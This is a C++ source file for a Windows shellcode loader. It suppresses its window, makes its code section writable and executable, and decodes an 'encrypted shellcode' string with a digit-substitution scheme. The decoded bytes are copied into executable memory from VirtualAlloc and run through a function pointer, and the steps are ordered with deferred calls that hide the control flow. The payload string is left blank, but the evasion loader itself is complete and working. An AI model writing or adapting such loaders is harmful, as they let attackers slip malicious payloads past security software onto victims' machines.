#include <windows.h>
#include <iostream>
#include <string>
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") // Suppress window
#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR") // Reduce compilation size

using namespace std;

template <typename F>
struct privDefer {
    F f;
    privDefer(F f) : f(f) {}
    ~privDefer() { f(); }
};

template <typename F>
privDefer<F> defer_func(F f) {
    return privDefer<F>(f);
}

#define DEFER_1(x, y) x##y
#define DEFER_2(x, y) DEFER_1(x, y)
#define DEFER_3(x)    DEFER_2(x, __COUNTER__)
#define defer(code)   auto DEFER_3(_defer_) = defer_func([&](){code;})

#ifdef UNICODE
#define GetModuleFileName  GetModuleFileNameW
#else
#define GetModuleFileName  GetModuleFileNameA
#endif

int main() {
    unsigned char ss[8000];
    const char str[] = "";// Encrypted shellcode here
    string str1(str);
    string passwd1 = str1.substr(0, 10);
    string Sangfor = str1.substr(10, str1.length());
    const char* passwd2 = passwd1.data();
    const char* Shenxinfu = Sangfor.data();
    int k = 0;

    for (int i = 0; i < Sangfor.length(); i++) {
        int len1 = Shenxinfu[i] - '0';
        string dange = "";

        for (int j = 0; j < len1; j++) {
            string a = to_string(Shenxinfu[i + j + 1] - '0');
            int a1 = passwd1.find(a);
            string a2 = to_string(a1);
            dange.append(a2);
        }

        i += len1;
        int dange4 = stoi(dange);
        ss[k] = static_cast<char>(dange4);
        k++;
    }

    LPVOID Memory = VirtualAlloc(NULL, sizeof(ss), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    defer(((void(*)())Memory)(););
    defer(memcpy(Memory, ss, sizeof(ss)););
    defer(if (Memory == NULL) { return 1; });
    
    return 0;
}
